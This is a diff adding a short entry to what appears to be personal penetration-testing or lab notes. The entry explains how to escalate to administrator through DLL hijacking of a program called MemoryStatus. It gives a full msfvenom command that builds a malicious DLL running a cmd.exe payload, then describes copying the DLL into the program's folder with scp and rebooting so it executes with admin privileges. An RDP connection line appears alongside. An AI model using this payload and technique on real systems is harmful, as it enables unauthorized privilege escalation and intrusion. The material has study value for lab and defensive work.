@@ -526,7 +526,11 @@ msfvenom to create dll
                     xfreerdp /u:comrade /v:localhost:1112 /dynamic-resolution +clipboard                                                                    to rdp from linux
 
 
-
+To run a command as admin using the Memory status vulnerability
+- find where MemoryStatus is running from, and what dll its using, ill be in the same folder as where memory status is running from
+- make the   msfvenom -p windows/exec CMD='cmd.exe /C "ls C:\Users\Admin\Desktop" > C:\Users\comrade.WIN2-INTERNAL-D\Priv.txt' -f dll > hijackmeplz.dll    do what you want with admin privleges 
+                                      |                  This is the admin privilege level command                            |
+- scp into where the Memory status gets executed from and restart the computer, the command executes
 
 
 
